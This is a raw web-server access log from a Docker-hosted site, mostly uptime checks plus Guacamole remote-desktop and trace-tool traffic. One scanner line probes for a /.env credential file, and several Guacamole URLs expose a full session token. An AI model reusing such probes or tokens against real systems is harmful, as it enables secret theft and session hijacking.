167.71.120.76 - - [15/Dec/2023:21:17:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2222 "www@docker" "http://172.28.0.10:80" 0ms
159.203.109.206 - - [15/Dec/2023:21:18:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2223 "www@docker" "http://172.28.0.10:80" 1ms
167.71.120.76 - - [15/Dec/2023:21:18:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2224 "www@docker" "http://172.28.0.10:80" 0ms
159.203.109.206 - - [15/Dec/2023:21:19:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2225 "www@docker" "http://172.28.0.10:80" 1ms
167.71.120.76 - - [15/Dec/2023:21:19:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2226 "www@docker" "http://172.28.0.10:80" 0ms
159.203.109.206 - - [15/Dec/2023:21:20:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2227 "www@docker" "http://172.28.0.10:80" 1ms
167.71.120.76 - - [15/Dec/2023:21:20:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2228 "www@docker" "http://172.28.0.10:80" 1ms
159.203.109.206 - - [15/Dec/2023:21:21:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2229 "www@docker" "http://172.28.0.10:80" 1ms
167.71.120.76 - - [15/Dec/2023:21:21:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2230 "www@docker" "http://172.28.0.10:80" 1ms
159.203.109.206 - - [15/Dec/2023:21:22:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2231 "www@docker" "http://172.28.0.10:80" 1ms
167.71.120.76 - - [15/Dec/2023:21:22:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2232 "www@docker" "http://172.28.0.10:80" 0ms
159.203.109.206 - - [15/Dec/2023:21:23:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2233 "www@docker" "http://172.28.0.10:80" 1ms
117.235.82.233 - - [15/Dec/2023:21:23:34 +0000] "GET / HTTP/1.1" 301 17 "-" "-" 2234 "web-to-websecure@internal" "-" 0ms
167.71.120.76 - - [15/Dec/2023:21:23:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2235 "www@docker" "http://172.28.0.10:80" 0ms
159.203.109.206 - - [15/Dec/2023:21:24:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2236 "www@docker" "http://172.28.0.10:80" 0ms
167.71.120.76 - - [15/Dec/2023:21:24:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2237 "www@docker" "http://172.28.0.10:80" 0ms
159.203.109.206 - - [15/Dec/2023:21:25:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2238 "www@docker" "http://172.28.0.10:80" 1ms
167.71.120.76 - - [15/Dec/2023:21:25:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2239 "www@docker" "http://172.28.0.10:80" 1ms
159.203.109.206 - - [15/Dec/2023:21:26:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2240 "www@docker" "http://172.28.0.10:80" 1ms
167.71.120.76 - - [15/Dec/2023:21:26:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2241 "www@docker" "http://172.28.0.10:80" 1ms
129.55.200.20 - - [15/Dec/2023:21:17:32 +0000] "GET /guacamole/websocket-tunnel?token=0F8EC6BBD8EBB320BE10004EC7094F5E43E84EE7F579B84827FC4948808B4C2E&GUAC_DATA_SOURCE=mysql&GUAC_ID=5&GUAC_TYPE=c&GUAC_WIDTH=2374&GUAC_HEIGHT=1508&GUAC_DPI=192&GUAC_TIMEZONE=America%2FNew_York&GUAC_AUDIO=audio%2FL8&GUAC_AUDIO=audio%2FL16&GUAC_IMAGE=image%2Fjpeg&GUAC_IMAGE=image%2Fpng&GUAC_IMAGE=image%2Fwebp HTTP/1.1" 0 0 "-" "-" 2219 "guacamole@docker" "http://172.28.0.9:8080" 577603ms
129.55.200.20 - - [15/Dec/2023:21:27:10 +0000] "POST /guacamole/api/tokens HTTP/2.0" 200 171 "-" "-" 2242 "guacamole@docker" "http://172.28.0.9:8080" 33ms
129.55.200.20 - - [15/Dec/2023:21:27:12 +0000] "POST /guacamole/api/tokens HTTP/2.0" 200 171 "-" "-" 2243 "guacamole@docker" "http://172.28.0.9:8080" 9ms
129.55.200.20 - - [15/Dec/2023:21:27:12 +0000] "GET /guacamole/api/session/data/mysql-shared/activeConnections HTTP/2.0" 200 2 "-" "-" 2245 "guacamole@docker" "http://172.28.0.9:8080" 7ms
129.55.200.20 - - [15/Dec/2023:21:27:12 +0000] "GET /guacamole/api/session/data/mysql/activeConnections HTTP/2.0" 200 2 "-" "-" 2244 "guacamole@docker" "http://172.28.0.9:8080" 54ms
129.55.200.20 - - [15/Dec/2023:21:27:14 +0000] "POST /guacamole/api/tokens HTTP/2.0" 200 171 "-" "-" 2246 "guacamole@docker" "http://172.28.0.9:8080" 5ms
129.55.200.20 - - [15/Dec/2023:21:27:14 +0000] "GET /guacamole/api/session/data/mysql/connections/9 HTTP/2.0" 200 300 "-" "-" 2247 "guacamole@docker" "http://172.28.0.9:8080" 25ms
129.55.200.20 - - [15/Dec/2023:21:27:14 +0000] "GET /guacamole/api/session/tunnels/26971313-c55b-3c02-a8ef-bc657a8bcb93/protocol HTTP/2.0" 200 5172 "-" "-" 2249 "guacamole@docker" "http://172.28.0.9:8080" 11ms
129.55.200.20 - - [15/Dec/2023:21:27:14 +0000] "GET /guacamole/api/session/tunnels/26971313-c55b-3c02-a8ef-bc657a8bcb93/activeConnection/connection/sharingProfiles HTTP/2.0" 200 2 "-" "-" 2250 "guacamole@docker" "http://172.28.0.9:8080" 83ms
159.203.109.206 - - [15/Dec/2023:21:27:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2251 "www@docker" "http://172.28.0.10:80" 21ms
167.71.120.76 - - [15/Dec/2023:21:27:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2252 "www@docker" "http://172.28.0.10:80" 21ms
159.203.109.206 - - [15/Dec/2023:21:28:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2253 "www@docker" "http://172.28.0.10:80" 1ms
167.71.120.76 - - [15/Dec/2023:21:28:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2254 "www@docker" "http://172.28.0.10:80" 0ms
159.203.109.206 - - [15/Dec/2023:21:29:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2255 "www@docker" "http://172.28.0.10:80" 1ms
167.71.120.76 - - [15/Dec/2023:21:29:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2256 "www@docker" "http://172.28.0.10:80" 0ms
159.203.109.206 - - [15/Dec/2023:21:30:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2257 "www@docker" "http://172.28.0.10:80" 1ms
167.71.120.76 - - [15/Dec/2023:21:30:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2258 "www@docker" "http://172.28.0.10:80" 1ms
159.203.109.206 - - [15/Dec/2023:21:31:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2259 "www@docker" "http://172.28.0.10:80" 1ms
167.71.120.76 - - [15/Dec/2023:21:31:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2260 "www@docker" "http://172.28.0.10:80" 1ms
159.203.109.206 - - [15/Dec/2023:21:32:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2261 "www@docker" "http://172.28.0.10:80" 1ms
167.71.120.76 - - [15/Dec/2023:21:32:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2262 "www@docker" "http://172.28.0.10:80" 0ms
159.203.109.206 - - [15/Dec/2023:21:33:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2263 "www@docker" "http://172.28.0.10:80" 0ms
167.71.120.76 - - [15/Dec/2023:21:33:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2264 "www@docker" "http://172.28.0.10:80" 1ms
159.203.109.206 - - [15/Dec/2023:21:34:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2265 "www@docker" "http://172.28.0.10:80" 0ms
167.71.120.76 - - [15/Dec/2023:21:34:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2266 "www@docker" "http://172.28.0.10:80" 0ms
159.203.109.206 - - [15/Dec/2023:21:35:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2267 "www@docker" "http://172.28.0.10:80" 1ms
167.71.120.76 - - [15/Dec/2023:21:35:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2268 "www@docker" "http://172.28.0.10:80" 1ms
159.203.109.206 - - [15/Dec/2023:21:36:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2269 "www@docker" "http://172.28.0.10:80" 1ms
167.71.120.76 - - [15/Dec/2023:21:36:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2270 "www@docker" "http://172.28.0.10:80" 1ms
159.203.109.206 - - [15/Dec/2023:21:37:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2271 "www@docker" "http://172.28.0.10:80" 1ms
167.71.120.76 - - [15/Dec/2023:21:37:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2272 "www@docker" "http://172.28.0.10:80" 1ms
146.190.47.101 - - [15/Dec/2023:21:37:40 +0000] "GET /script HTTP/1.1" 404 19 "-" "-" 2273 "-" "-" 0ms
159.203.109.206 - - [15/Dec/2023:21:38:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2274 "www@docker" "http://172.28.0.10:80" 1ms
167.71.120.76 - - [15/Dec/2023:21:38:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2275 "www@docker" "http://172.28.0.10:80" 0ms
159.203.109.206 - - [15/Dec/2023:21:39:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2276 "www@docker" "http://172.28.0.10:80" 0ms
167.71.120.76 - - [15/Dec/2023:21:39:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2277 "www@docker" "http://172.28.0.10:80" 1ms
159.203.109.206 - - [15/Dec/2023:21:40:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2278 "www@docker" "http://172.28.0.10:80" 1ms
167.71.120.76 - - [15/Dec/2023:21:40:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2279 "www@docker" "http://172.28.0.10:80" 0ms
159.203.109.206 - - [15/Dec/2023:21:41:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2280 "www@docker" "http://172.28.0.10:80" 0ms
167.71.120.76 - - [15/Dec/2023:21:41:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2281 "www@docker" "http://172.28.0.10:80" 1ms
159.203.109.206 - - [15/Dec/2023:21:42:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2282 "www@docker" "http://172.28.0.10:80" 0ms
167.71.120.76 - - [15/Dec/2023:21:42:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2283 "www@docker" "http://172.28.0.10:80" 0ms
159.203.109.206 - - [15/Dec/2023:21:43:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2284 "www@docker" "http://172.28.0.10:80" 0ms
167.71.120.76 - - [15/Dec/2023:21:43:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2285 "www@docker" "http://172.28.0.10:80" 1ms
159.203.109.206 - - [15/Dec/2023:21:44:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2286 "www@docker" "http://172.28.0.10:80" 1ms
167.71.120.76 - - [15/Dec/2023:21:44:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2287 "www@docker" "http://172.28.0.10:80" 1ms
159.203.109.206 - - [15/Dec/2023:21:45:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2288 "www@docker" "http://172.28.0.10:80" 1ms
167.71.120.76 - - [15/Dec/2023:21:45:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2289 "www@docker" "http://172.28.0.10:80" 1ms
159.203.109.206 - - [15/Dec/2023:21:46:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2290 "www@docker" "http://172.28.0.10:80" 0ms
167.71.120.76 - - [15/Dec/2023:21:46:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2291 "www@docker" "http://172.28.0.10:80" 0ms
159.203.109.206 - - [15/Dec/2023:21:47:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2292 "www@docker" "http://172.28.0.10:80" 1ms
167.71.120.76 - - [15/Dec/2023:21:47:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2293 "www@docker" "http://172.28.0.10:80" 1ms
159.203.109.206 - - [15/Dec/2023:21:48:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2294 "www@docker" "http://172.28.0.10:80" 0ms
167.71.120.76 - - [15/Dec/2023:21:48:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2295 "www@docker" "http://172.28.0.10:80" 0ms
159.203.109.206 - - [15/Dec/2023:21:49:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2296 "www@docker" "http://172.28.0.10:80" 1ms
167.71.120.76 - - [15/Dec/2023:21:49:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2297 "www@docker" "http://172.28.0.10:80" 0ms
159.203.109.206 - - [15/Dec/2023:21:50:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2298 "www@docker" "http://172.28.0.10:80" 1ms
167.71.120.76 - - [15/Dec/2023:21:50:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2299 "www@docker" "http://172.28.0.10:80" 0ms
159.203.109.206 - - [15/Dec/2023:21:51:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2300 "www@docker" "http://172.28.0.10:80" 1ms
167.71.120.76 - - [15/Dec/2023:21:51:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2301 "www@docker" "http://172.28.0.10:80" 0ms
159.203.109.206 - - [15/Dec/2023:21:52:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2302 "www@docker" "http://172.28.0.10:80" 0ms
167.71.120.76 - - [15/Dec/2023:21:52:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2303 "www@docker" "http://172.28.0.10:80" 0ms
129.55.200.20 - - [15/Dec/2023:21:27:14 +0000] "GET /guacamole/websocket-tunnel?token=0F8EC6BBD8EBB320BE10004EC7094F5E43E84EE7F579B84827FC4948808B4C2E&GUAC_DATA_SOURCE=mysql&GUAC_ID=9&GUAC_TYPE=c&GUAC_WIDTH=2374&GUAC_HEIGHT=1508&GUAC_DPI=192&GUAC_TIMEZONE=America%2FNew_York&GUAC_AUDIO=audio%2FL8&GUAC_AUDIO=audio%2FL16&GUAC_IMAGE=image%2Fjpeg&GUAC_IMAGE=image%2Fpng&GUAC_IMAGE=image%2Fwebp HTTP/1.1" 0 0 "-" "-" 2248 "guacamole@docker" "http://172.28.0.9:8080" 1555045ms
159.203.109.206 - - [15/Dec/2023:21:53:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2304 "www@docker" "http://172.28.0.10:80" 0ms
167.71.120.76 - - [15/Dec/2023:21:53:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2305 "www@docker" "http://172.28.0.10:80" 0ms
159.203.109.206 - - [15/Dec/2023:21:54:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2306 "www@docker" "http://172.28.0.10:80" 1ms
167.71.120.76 - - [15/Dec/2023:21:54:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2307 "www@docker" "http://172.28.0.10:80" 1ms
159.203.109.206 - - [15/Dec/2023:21:55:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2308 "www@docker" "http://172.28.0.10:80" 1ms
167.71.120.76 - - [15/Dec/2023:21:55:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2309 "www@docker" "http://172.28.0.10:80" 1ms
159.203.109.206 - - [15/Dec/2023:21:56:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2310 "www@docker" "http://172.28.0.10:80" 0ms
167.71.120.76 - - [15/Dec/2023:21:56:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2311 "www@docker" "http://172.28.0.10:80" 1ms
159.203.109.206 - - [15/Dec/2023:21:57:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2312 "www@docker" "http://172.28.0.10:80" 1ms
167.71.120.76 - - [15/Dec/2023:21:57:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2313 "www@docker" "http://172.28.0.10:80" 0ms
159.203.109.206 - - [15/Dec/2023:21:58:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2314 "www@docker" "http://172.28.0.10:80" 1ms
167.71.120.76 - - [15/Dec/2023:21:58:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2315 "www@docker" "http://172.28.0.10:80" 0ms
159.203.109.206 - - [15/Dec/2023:21:59:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2316 "www@docker" "http://172.28.0.10:80" 1ms
167.71.120.76 - - [15/Dec/2023:21:59:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2317 "www@docker" "http://172.28.0.10:80" 1ms
198.235.24.67 - - [15/Dec/2023:21:59:56 +0000] "GET / HTTP/1.1" 301 17 "-" "-" 2318 "web-to-websecure@internal" "-" 0ms
159.203.109.206 - - [15/Dec/2023:22:00:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2319 "www@docker" "http://172.28.0.10:80" 0ms
167.71.120.76 - - [15/Dec/2023:22:00:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2320 "www@docker" "http://172.28.0.10:80" 1ms
159.203.109.206 - - [15/Dec/2023:22:01:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2321 "www@docker" "http://172.28.0.10:80" 1ms
167.71.120.76 - - [15/Dec/2023:22:01:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2322 "www@docker" "http://172.28.0.10:80" 1ms
159.203.109.206 - - [15/Dec/2023:22:02:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2323 "www@docker" "http://172.28.0.10:80" 1ms
54.36.115.221 - - [15/Dec/2023:22:02:37 +0000] "GET /.env HTTP/1.1" 301 17 "-" "-" 2324 "web-to-websecure@internal" "-" 0ms
167.71.120.76 - - [15/Dec/2023:22:02:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2325 "www@docker" "http://172.28.0.10:80" 1ms
54.36.115.221 - - [15/Dec/2023:22:02:37 +0000] "POST / HTTP/1.1" 308 18 "-" "-" 2326 "web-to-websecure@internal" "-" 0ms
159.203.109.206 - - [15/Dec/2023:22:03:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2327 "www@docker" "http://172.28.0.10:80" 1ms
167.71.120.76 - - [15/Dec/2023:22:03:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2328 "www@docker" "http://172.28.0.10:80" 1ms
159.203.109.206 - - [15/Dec/2023:22:04:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2329 "www@docker" "http://172.28.0.10:80" 1ms
167.71.120.76 - - [15/Dec/2023:22:04:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2330 "www@docker" "http://172.28.0.10:80" 0ms
159.203.109.206 - - [15/Dec/2023:22:05:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2331 "www@docker" "http://172.28.0.10:80" 1ms
167.71.120.76 - - [15/Dec/2023:22:05:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2332 "www@docker" "http://172.28.0.10:80" 1ms
159.203.109.206 - - [15/Dec/2023:22:06:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2333 "www@docker" "http://172.28.0.10:80" 0ms
167.71.120.76 - - [15/Dec/2023:22:06:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2334 "www@docker" "http://172.28.0.10:80" 1ms
159.203.109.206 - - [15/Dec/2023:22:07:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2335 "www@docker" "http://172.28.0.10:80" 1ms
167.71.120.76 - - [15/Dec/2023:22:07:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2336 "www@docker" "http://172.28.0.10:80" 1ms
159.203.109.206 - - [15/Dec/2023:22:08:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2337 "www@docker" "http://172.28.0.10:80" 1ms
167.71.120.76 - - [15/Dec/2023:22:08:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2338 "www@docker" "http://172.28.0.10:80" 0ms
159.203.109.206 - - [15/Dec/2023:22:09:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2339 "www@docker" "http://172.28.0.10:80" 1ms
167.71.120.76 - - [15/Dec/2023:22:09:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2340 "www@docker" "http://172.28.0.10:80" 1ms
159.203.109.206 - - [15/Dec/2023:22:10:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2341 "www@docker" "http://172.28.0.10:80" 1ms
167.71.120.76 - - [15/Dec/2023:22:10:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2342 "www@docker" "http://172.28.0.10:80" 0ms
159.203.109.206 - - [15/Dec/2023:22:11:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2343 "www@docker" "http://172.28.0.10:80" 1ms
167.71.120.76 - - [15/Dec/2023:22:11:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2344 "www@docker" "http://172.28.0.10:80" 1ms
205.210.31.86 - - [15/Dec/2023:22:12:17 +0000] "GET / HTTP/1.1" 404 19 "-" "-" 2345 "-" "-" 0ms
159.203.109.206 - - [15/Dec/2023:22:12:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2346 "www@docker" "http://172.28.0.10:80" 0ms
167.71.120.76 - - [15/Dec/2023:22:12:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2347 "www@docker" "http://172.28.0.10:80" 1ms
159.203.109.206 - - [15/Dec/2023:22:13:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2348 "www@docker" "http://172.28.0.10:80" 0ms
167.71.120.76 - - [15/Dec/2023:22:13:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2349 "www@docker" "http://172.28.0.10:80" 1ms
159.203.109.206 - - [15/Dec/2023:22:14:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2350 "www@docker" "http://172.28.0.10:80" 1ms
167.71.120.76 - - [15/Dec/2023:22:14:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2351 "www@docker" "http://172.28.0.10:80" 1ms
159.203.109.206 - - [15/Dec/2023:22:15:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2352 "www@docker" "http://172.28.0.10:80" 1ms
12.248.214.166 - - [15/Dec/2023:22:15:23 +0000] "GET /trace/ HTTP/2.0" 200 2243 "-" "-" 2353 "livetrace@docker" "http://172.28.0.5:80" 5043ms
12.248.214.166 - - [15/Dec/2023:22:15:29 +0000] "GET /trace/styles.css?version=0.7 HTTP/2.0" 304 0 "-" "-" 2354 "livetrace@docker" "http://172.28.0.5:80" 1ms
12.248.214.166 - - [15/Dec/2023:22:15:32 +0000] "GET /trace/start.php?id=os7w3vcln HTTP/2.0" 200 104 "-" "-" 2355 "livetrace@docker" "http://172.28.0.5:80" 4ms
12.248.214.166 - - [15/Dec/2023:22:15:33 +0000] "GET /trace/poll.php?id=os7w3vcln HTTP/2.0" 200 90 "-" "-" 2356 "livetrace@docker" "http://172.28.0.5:80" 2ms
12.248.214.166 - - [15/Dec/2023:22:15:34 +0000] "GET /trace/poll.php?id=os7w3vcln HTTP/2.0" 200 90 "-" "-" 2357 "livetrace@docker" "http://172.28.0.5:80" 2ms
12.248.214.166 - - [15/Dec/2023:22:15:35 +0000] "GET /trace/poll.php?id=os7w3vcln HTTP/2.0" 200 91 "-" "-" 2358 "livetrace@docker" "http://172.28.0.5:80" 2ms
12.248.214.166 - - [15/Dec/2023:22:15:36 +0000] "GET /trace/poll.php?id=os7w3vcln HTTP/2.0" 200 91 "-" "-" 2359 "livetrace@docker" "http://172.28.0.5:80" 1ms
167.71.120.76 - - [15/Dec/2023:22:15:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2360 "www@docker" "http://172.28.0.10:80" 1ms
12.248.214.166 - - [15/Dec/2023:22:15:37 +0000] "GET /trace/poll.php?id=os7w3vcln HTTP/2.0" 200 91 "-" "-" 2361 "livetrace@docker" "http://172.28.0.5:80" 2ms
12.248.214.166 - - [15/Dec/2023:22:15:38 +0000] "GET /trace/poll.php?id=os7w3vcln HTTP/2.0" 200 91 "-" "-" 2362 "livetrace@docker" "http://172.28.0.5:80" 2ms
12.248.214.166 - - [15/Dec/2023:22:15:39 +0000] "GET /trace/poll.php?id=os7w3vcln HTTP/2.0" 200 91 "-" "-" 2363 "livetrace@docker" "http://172.28.0.5:80" 2ms
12.248.214.166 - - [15/Dec/2023:22:15:40 +0000] "GET /trace/poll.php?id=os7w3vcln HTTP/2.0" 200 101 "-" "-" 2364 "livetrace@docker" "http://172.28.0.5:80" 1ms
12.248.214.166 - - [15/Dec/2023:22:15:40 +0000] "GET /trace/cleanup.php?id=os7w3vcln HTTP/2.0" 200 71 "-" "-" 2365 "livetrace@docker" "http://172.28.0.5:80" 3ms
143.110.222.166 - - [15/Dec/2023:22:15:59 +0000] "GET / HTTP/1.1" 301 17 "-" "-" 2366 "web-to-websecure@internal" "-" 0ms
159.203.109.206 - - [15/Dec/2023:22:16:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2367 "www@docker" "http://172.28.0.10:80" 1ms
167.71.120.76 - - [15/Dec/2023:22:16:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2368 "www@docker" "http://172.28.0.10:80" 1ms
162.221.192.26 - - [15/Dec/2023:22:16:43 +0000] "GET / HTTP/1.1" 404 19 "-" "-" 2369 "-" "-" 0ms
159.203.109.206 - - [15/Dec/2023:22:17:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2370 "www@docker" "http://172.28.0.10:80" 1ms
167.71.120.76 - - [15/Dec/2023:22:17:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2371 "www@docker" "http://172.28.0.10:80" 0ms
159.203.109.206 - - [15/Dec/2023:22:18:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2372 "www@docker" "http://172.28.0.10:80" 1ms
167.71.120.76 - - [15/Dec/2023:22:18:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2373 "www@docker" "http://172.28.0.10:80" 1ms
159.203.109.206 - - [15/Dec/2023:22:19:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2374 "www@docker" "http://172.28.0.10:80" 1ms
167.71.120.76 - - [15/Dec/2023:22:19:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2375 "www@docker" "http://172.28.0.10:80" 1ms
159.203.109.206 - - [15/Dec/2023:22:20:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2376 "www@docker" "http://172.28.0.10:80" 0ms
167.71.120.76 - - [15/Dec/2023:22:20:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2377 "www@docker" "http://172.28.0.10:80" 1ms
185.180.143.190 - - [15/Dec/2023:22:20:41 +0000] "GET / HTTP/1.1" 301 17 "-" "-" 2378 "web-to-websecure@internal" "-" 0ms
159.203.109.206 - - [15/Dec/2023:22:21:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2379 "www@docker" "http://172.28.0.10:80" 1ms
167.71.120.76 - - [15/Dec/2023:22:21:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2380 "www@docker" "http://172.28.0.10:80" 0ms
159.203.109.206 - - [15/Dec/2023:22:22:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2381 "www@docker" "http://172.28.0.10:80" 1ms
167.71.120.76 - - [15/Dec/2023:22:22:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2382 "www@docker" "http://172.28.0.10:80" 0ms
159.203.109.206 - - [15/Dec/2023:22:23:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2383 "www@docker" "http://172.28.0.10:80" 1ms
167.71.120.76 - - [15/Dec/2023:22:23:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2384 "www@docker" "http://172.28.0.10:80" 1ms
159.203.109.206 - - [15/Dec/2023:22:24:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2385 "www@docker" "http://172.28.0.10:80" 1ms
167.71.120.76 - - [15/Dec/2023:22:24:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2386 "www@docker" "http://172.28.0.10:80" 1ms
159.203.109.206 - - [15/Dec/2023:22:25:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2387 "www@docker" "http://172.28.0.10:80" 1ms
167.71.120.76 - - [15/Dec/2023:22:25:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2388 "www@docker" "http://172.28.0.10:80" 1ms
159.203.109.206 - - [15/Dec/2023:22:26:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2389 "www@docker" "http://172.28.0.10:80" 1ms
167.71.120.76 - - [15/Dec/2023:22:26:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2390 "www@docker" "http://172.28.0.10:80" 0ms
159.203.109.206 - - [15/Dec/2023:22:27:22 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2391 "www@docker" "http://172.28.0.10:80" 1ms
